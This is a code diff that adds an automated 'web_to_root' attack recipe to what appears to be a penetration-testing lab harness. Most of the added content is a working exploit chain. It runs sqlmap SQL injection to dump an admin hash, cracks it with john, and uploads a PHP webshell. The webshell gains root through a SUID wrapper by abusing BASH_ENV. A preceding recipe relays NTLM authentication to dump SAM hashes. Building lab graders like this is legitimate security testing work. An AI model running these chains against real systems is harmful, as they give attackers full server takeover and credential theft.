@@ -591,6 +591,50 @@ printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '
         # member, not the DC).
         command=r""": > /tmp/portal-relay.log; impacket-ntlmrelayx -t smb://"$TARGET_HOST" -smb2support --no-http-server > /tmp/portal-relay.log 2>&1 < <(sleep 25) & sleep 3; smbclient -U 'portal.lab/administrator%LabAdmin1!' -L //127.0.0.1/ -m SMB3 >/dev/null 2>&1; sleep 5; relay_log=$(cat /tmp/portal-relay.log); printf '%s\n' "$(printf '%s' "$relay_log" | grep -m1 'Authenticating connection')"; printf '%s\n' "$(printf '%s' "$relay_log" | grep -Ei 'Dumping local SAM|^Administrator:500')"; printf '%s' "$relay_log" | grep -q 'SUCCEED' && printf '%s' "$relay_log" | grep -Eq '^Administrator:500:' && echo __PORTAL_RECIPE_OK__"""
     ),
+    # ── MBPTL (Most Basic Penetration Testing Lab, Docker/LXC 300) recipes ──
+    "web_to_root": CaptureRecipe(
+        # Found live 2026-08-01: the admin credential lives in a SEPARATE
+        # `administrator` database (not `bookstore`, which only has a
+        # `books` table) -- `sqlmap --dbs` was needed to find it. The
+        # cracked MD5 (rockyou.txt via john, admin:P@ssw0rd!) logs into the
+        # SEPARATE app on port 8080 (port 80 is only the read-only book
+        # list; port 8080 shows "Under Maintenance" until authenticated).
+        # POSTing the upload form to the bare /administrator/ path silently
+        # drops the file (still 302s, but the row never lands in `books`,
+        # and the session even appears to have been reset for the NEXT
+        # request in some captures) -- POSTing to /administrator/admin.php
+        # directly (the same page the login redirects to) is what actually
+        # persists it, confirmed via re-querying `books` by title through
+        # the same SQLi. Uploaded images are saved under a random-hex
+        # filename in /administrator/uploads/ with NO extension filtering
+        # (accept="image/*" is client-side only) and are PHP-executable
+        # there -- proven with a plain (non-image) .php upload.
+        # For privesc: `find / -perm -4000` turns up /usr/bin/bahs, a
+        # 16KB SUID-root ELF -- NOT a renamed copy of the real 1.1MB
+        # /usr/bin/bash. `strings` (unavailable in this minimal target, so
+        # verified by base64-exfiltrating the binary and pattern-matching
+        # locally) shows it is a tiny wrapper: setuid(0); setgid(0);
+        # system("/bin/bash"). Because system() spawns bash non-
+        # interactively with no controlling tty, passing "-c"/"-p" via the
+        # webshell's argv never reaches it -- bash just reads EOF from
+        # closed stdin and exits 0 with no output. The real bypass: bash
+        # (even non-interactive, non-login) sources $BASH_ENV as a script
+        # on startup if set. The webshell writes the requested command to
+        # /tmp/x.sh, calls putenv("BASH_ENV=/tmp/x.sh") (inherited by the
+        # subsequent system() call), then invokes /usr/bin/bahs -- which
+        # setuid(0)s FIRST and only then runs bash, so /tmp/x.sh executes
+        # as root. Confirmed live: uid=0(root) and a real /flag/root.txt
+        # read (MBPTL-9{...}), matching this scenario's T1548.001 ground
+        # truth (SUID/GUID abuse) and T1059.004 (webshell-launched Unix
+        # shell command execution) directly, with the initial SQLi footing
+        # T1190. Both sqlmap calls parse the real MySQL response/dump text
+        # (grep on the fixed-width `| <32-hex> |` dump-table row for the
+        # hash, and on the fixed `uploads/<32-hex>.php` filename pattern
+        # for the freshly uploaded shell's path) rather than any hardcoded
+        # value, and the upload title is timestamp-suffixed so repeat runs
+        # never collide on a prior run's row.
+        command=r"""title="w2r_$(date +%s)"; dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1); hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}'); printf 'admin:%s\n' "$hash" > /tmp/w2r_hash.txt; john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/w2r_hash.txt >/dev/null 2>&1; crack=$(john --show --format=raw-md5 /tmp/w2r_hash.txt 2>/dev/null | head -1); pass=$(printf '%s' "$crack" | cut -d: -f2); jar=/tmp/w2r_$$.cookies; curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null; curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null; printf '<?php file_put_contents("/tmp/x.sh", $_GET["e"]); chmod("/tmp/x.sh", 0777); putenv("BASH_ENV=/tmp/x.sh"); system("/usr/bin/bahs 2>&1"); ?>' > /tmp/w2r_shell.php; curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/w2r_shell.php;filename=w2r_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null; sleep 1; sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1); shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1); shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"; root_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode 'e=id; cat /flag/root.txt' 2>&1); echo "hash_found=$([ -n "$hash" ] && echo yes || echo no) pass_cracked=$([ -n "$pass" ] && echo yes || echo no)"; printf '%s\n' "$root_out"; printf '%s' "$root_out" | grep -q 'uid=0' && printf '%s' "$root_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
